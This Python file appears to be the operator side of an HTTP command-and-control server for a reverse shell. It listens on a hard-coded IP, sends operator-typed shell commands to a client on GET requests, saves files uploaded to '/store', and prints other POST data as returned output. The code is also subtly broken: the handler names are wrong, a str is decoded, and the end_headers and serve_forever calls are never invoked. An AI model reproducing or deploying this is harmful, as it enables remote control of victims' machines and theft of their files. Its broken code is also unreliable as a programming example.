import http.server
import cgi

HOST_NAME = "192.162.42.129"
PORT_NAME = 8080


class MyHandler(http.server.BaseHTTPRequestHandler):

    def doGet(self):
        command = input("Shell >")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.decode())

    def doPost(self):
        if self.path == "/store":
            ctype, s = cgi.parse_header(self.headers["Content-type"])
            if ctype == "multipart/form-data":
                fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={
                                      "REQUEST_METHOD": "POST"})
            else:
                print("[-] File not found")

            fs_up = fs["files"]
            with open("test.png", 'wb') as o:
                o.write(fs_up.file.read())
                self.send_response(200)
                self.end_headers()

        self.send_response(200)
        self.end_headers
        length = self.headers["Content-length"]
        data = self.rfile.read(length)
        print(data.decode())


if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NAME), MyHandler)
    try:
        httpd.serve_forever
    except Exception as e:
        print("Server can't start! ", e)
